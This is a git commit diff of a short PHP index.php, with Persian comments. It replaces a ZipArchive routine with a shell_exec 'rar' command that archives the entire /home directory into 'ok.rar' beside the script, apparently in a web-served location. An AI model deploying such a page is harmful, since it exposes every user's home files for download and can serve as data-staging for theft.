e7be10dc0d2cec4d0ed59bb4ba86e325ff53b4bb
PySudoORG <139513562+PySudoORG@users.noreply.github.com>
2023-12-11 23:27:46 +0330

    Update index.php

--- index.php
+++ index.php
@@ -1,41 +1,10 @@
-function zipDirectory($source, $destination)
-{
-    if (!extension_loaded('zip') || !file_exists($source)) {
-        return false;
-    }
+<?php
+$sourceDir = '/home';
+$destinationRar = './ok.rar';
 
-    $zip = new ZipArchive();
-    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
-        return false;
-    }
+// اجرای دستور rar در خط فرمان برای فشرده‌سازی دایرکتوری
+$cmd = "rar a -r $destinationRar $sourceDir";
+$output = shell_exec($cmd);
 
-    $source = realpath($source);
-
-    if (is_dir($source)) {
-        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
-
-        foreach ($files as $file) {
-            $file = realpath($file);
-
-            if (is_dir($file)) {
-                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
-            } elseif (is_file($file)) {
-                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
-            }
-        }
-    } elseif (is_file($source)) {
-        $zip->addFromString(basename($source), file_get_contents($source));
-    }
-
-    return $zip->close();
-}
-
-// استفاده:
-$source = '/home';
-$destination = './tt.zip';
-
-if (zipDirectory($source, $destination)) {
-    echo 'فایل ZIP با موفقیت ایجاد شد!';
-} else {
-    echo 'مشکلی در ایجاد فایل ZIP به وجود آمد!';
-}
+echo "فایل RAR با موفقیت ایجاد شد!";
+?>
